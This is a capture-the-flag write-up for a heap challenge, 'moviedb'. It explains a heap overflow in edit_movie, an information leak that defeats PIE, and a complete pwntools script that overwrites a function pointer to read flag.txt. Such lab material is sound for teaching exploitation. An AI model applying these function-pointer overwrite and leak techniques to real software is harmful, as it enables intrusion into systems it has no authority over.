# Heap Exploit - MovieDB Writeup

Note: This guest challenge is created by Urs Müller, urs.mueller AT protonmail.com.

## Prerequisites
The reader is assumed to have a basic understanding of the `C` programming language, the `x86_64` instruction set,
and Python.

The following tools will be used:
* GDB debugger with [PEDA](https://github.com/longld/peda)
* Python2
* [Pwntools](https://docs.pwntools.com/en/stable/) (a useful Python library for writing exploits)

All Linux terminal and GDB commands are preceeded by `$` and `#`, respectively.

* The Movie-DB binary is located in `~/challenges/challenge32/source/` and can be compiled by typing `make`.
* The exploit is located in `~/challenges/challenge32/exploit/`.

## Getting Started
In this challenge we are given a binary `moviedb` and the goal is to read the contents of the file `flag.txt`.

Let's first gather some basic information about the binary. Running the file command shows that we are dealing with a 64-bit ELF binary whose symbols have been stripped (i.e. all
variable, function, and `struct` names have been removed).
```
$ file moviedb
moviedb: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0912f612fb8ee7143a7de9a95c4a93dfe1f08270, stripped
```

We also run the PEDA `checksec` tool (inside GDB) to inspect the exploit mitigations:
```
$ gdb ./moviedb
[CUT]
# checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
* `CANARY`: Stack canary to protect against stack-based buffer overflows; hence, buffer overflows are not feasible unless we can somehow leak the (random) canary.
* `NX`: The stack is not executable; in fact, no memory segment is executable but the code section.
* `PIE`: The application code is loaded at a random address (PIE stands for Position Independent Executable);
* `RELRO`: The dynamic linker will resolve calls to imported libraries when the function is called for the first time (instead of doing it while loading the program).

More detailed information can be found [here](http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/).

## Optional: Make it running (reversing)

Before reverse engineering a program it is often a good idea to first fool around with
the program to obtain a feel for what the program does and how it works. However, when we run the program it immediately exits with the following error message:
```
$ ./moviedb
File does not exist... exiting now: No such file or directory
```
At this point we could start reverse engineering the code and see which file is missing. While this is certainfly
feasible for such a small program, it is usually more straightforward to simply use the `strace` command line tool:

```
$ strace -e open ./moviedb
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
open("/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
open("welcome-message.txt", O_RDONLY)   = -1 ENOENT (No such file or directory)
File does not exist... exiting now: No such file or directory
+++ exited with 1 +++
```
Note that the file `welcome-message.txt` is missing. Let's create our own and verify that the program starts correctly
(note our custom welcome message in the output):
```
$ echo "This is our own welcome message" > welcome-message.txt
$ ./moviedb
This is our own welcome message

1) Add Movie
2) Remove Movie
3) Edit Movie
4) Print Movies
5) Exit
>
```

## Usage

It seems to be some kind of movie database, where movie titles can be added, removed, edited and printed.

```
root@hlUbuntu64:~/challenges/challenge32/source# ./moviedb
*************************************************************
*** Welcome to Movie Database 2000. It still lacks        ***
*** some features like persistency but hey, at least it's ***
*** safe =)                                               ***
*************************************************************
1) Add Movie
2) Remove Movie
3) Edit Movie
4) Print Movies
5) Exit
> 1
Name: Hackers
Description: Crime Film
Year: 1995
Duration: 107
1) Add Movie
2) Remove Movie
3) Edit Movie
4) Print Movies
5) Exit
> 4

--- Available Movies ---

Name: Hackers
Description: Crime Film
Publishing year: 1995
Duration: 107 minutes

------------------------

1) Add Movie
2) Remove Movie
3) Edit Movie
4) Print Movies
5) Exit
> 5
Bye Bye
```

After playing around with it the time is ripe to take a look at the source code (or reverse engineer the binary) and
find vulnerabilities.

## Vulnerabilities

At this point you should have a good understanding of how the program is implemented and we are ready to look at the
vulnerabilities (this is a pwning challenge after all).

### Heap Overflow

The header file `movie.h` defines two constants that describe the maximum length of a movie title and description:
```
#define MAX_MOVIE_NAME_LEN 40
#define MAX_MOVIE_DESCRIPTION_LEN 512

struct Movie
{
	char description[MAX_MOVIE_DESCRIPTION_LEN];
	char name[MAX_MOVIE_NAME_LEN];
	int duration;
	int year;
	void (*print)();
	struct list_head list;
};
```

However, in the function `edit_movie` an invalid title length is specified (`MAX_MOVIE_DESCRIPTON_LEN` is used instead of `MAX_MOVIE_TITLE_LEN`):

```
void edit_movie()
{
	char name[MAX_MOVIE_NAME_LEN];
	printf("Name: ");
	read_n_line(name, MAX_MOVIE_NAME_LEN);

	struct Movie *m = find_movie(name);
	if ( !m )
	{
		puts("Movie does not exist");
		return;
	}

	printf("New name: ");
	read_n_line(m->name, MAX_MOVIE_DESCRIPTION_LEN);

	printf("New description: ");
	read_n_line(m->description, MAX_MOVIE_DESCRIPTION_LEN);

	printf("New duration: ");
	m->duration = read_int_line();

	printf("New year: ");
	m->year = read_int_line();
}
```

This of course leads to an overflow since `MAX_MOVIE_DESCRIPTION_LEN > MAX_MOVIE_NAME_LEN`. This allows us to
override the `void (*print)()` function pointer.

### Information Leak
We have seen that we can override a function pointer with an arbitrary value, but what should this value be? Recall
that the code is PIE compiled and therefore all code addresses are randomized. Since this is a 64-bit binary the
entropy of the randomness is too damn high for a brute-force attack. But hey, we can always find a vulnerability
that leaks some code address! This type of vulnerability is usually called an information leak.

To read up to `n` bytes of a (newline-terminated) input line the following two functions are used:
```
size_t read_n_until(char *dst, size_t nbytes, char c)
{
	char in;
	size_t n;
	for ( n = 0; n < nbytes; ++n )
	{
		if ( read(0, &in, 1) != 1 )
		{
			puts("Error while reading... exiting now.");
			exit(1);
		}

		if ( in == c )
		{
			dst[n] = 0;
			break;
		}

		dst[n] = in;
	}

	return n;
}

size_t read_n_line(char *dst, size_t nbytes)
{
	return read_n_until(dst, nbytes, '\n');
}
```
Note that the second `if`-statement is never executed if the input does not contain a newline character. Hence, if we create a movie with the following values (Python string syntax):

* `description`: `'A' * MAX_MOVIE_DESCRIPTION_LEN`
* `name`: `'A' * MAX_MOVIE_NAME_LEN`
* `duration`: `0xffffffff`
* `year`: `0xffffffff`

we can leak the `print` function pointer by simply printing a movie. It is worth mentioning that we can pick any value
for `duration` and `year` as long as they do not contain any `null`-bytes. For example, `0x3a00fe2a` does not work because
`printf` would stop printing at the `null`-byte and never get to the function pointer value.

## Exploit

The following function, which reads a file and displays the content, plays a crucial role in the exploit (recall that we have seen the error message in a previous section):
```
void print_welcome_message(char *file_name)
{
	FILE *fd;
	int c;

	if ( !(fd = fopen(file_name, "rb")) )
	{
		perror("Movie does not exist... exiting now.");
		exit(1);
	}

	while ( 1 )
	{
		c = getc(fd);
		if ( c == -1 )
			break;
		putchar(c);
	}

	fclose(fd);
}
```

Note that if we call this function with a movie `struct` (instead of a file name) then the program opens a file with the name of the movie description (this is due to the fact that the movie description is stored in the beginning of the movie `struct`).

We can now read the file `flag.txt` as follows:
1. Create a movie as described in "Information Leakage" above. Leak the base address of the `moviedb` code section from which we can readily compute the address of the function `print_welcome_message` (if you disassemble the binary you will see that the function `print_welcome_message` is at offset `0xee0`).
2. Create a new movie with description `flag.txt`. Then override the function pointer `void (*print)()` such that it points to the function `print_welcome_message` .
3. Print the movie created in step two (this step will call `print_welcome_message` with the movie as argument)

The complete exploit is given in the following Python script:
```python
from pwn import *

MAX_MOVIE_NAME_LEN = 40
MAX_MOVIE_DESCRIPTION_LEN = 512

s = process('./moviedb')
s.readuntil('>')

### STEP 1 ###

s.sendline('1')
s.sendafter('Name: ', 'A' * MAX_MOVIE_NAME_LEN)
s.sendafter('Description: ', 'A' * MAX_MOVIE_DESCRIPTION_LEN)
s.sendlineafter('Year: ', str(0xffffffff))
s.sendlineafter('Duration: ', str(0xffffffff))
s.sendlineafter('> ', '4')

data = s.readuntil(p64(0xffffffffffffffff))
bin_base = u64(s.read(6).ljust(8, '\x00')) - 0x12b0
print '[*] Binary base address: 0x%016x' % bin_base
s.readuntil('>')


### STEP 2 ####

# Add a new movie (note that we cannot edit the old movie since the program does not find it due to the invalid name)
s.sendline('1')
s.sendlineafter('Name: ', 'Title')
s.sendlineafter('Description: ', 'XXXX')
s.sendlineafter('Year: ', '42')
s.sendlineafter('Duration: ', '42')
s.sendlineafter('> ', '4')

# Overflow function pointer
s.sendline('3')
s.sendlineafter('Name: ', 'Title')
s.sendlineafter('New name: ', p64(bin_base + 0xee0) * 8)
s.sendlineafter('New description: ', 'flag.txt')
s.sendlineafter('New duration: ', '42')
s.sendlineafter('New year: ', '42')

# Print movie and read the flag. Note that we use s.interactive() here because the program crashes afterwards and this
# is a simple way to retrieve all program output (normally s.interactive() is used to get an interactive shell).
s.sendlineafter('> ', '4')
s.interactive()
```
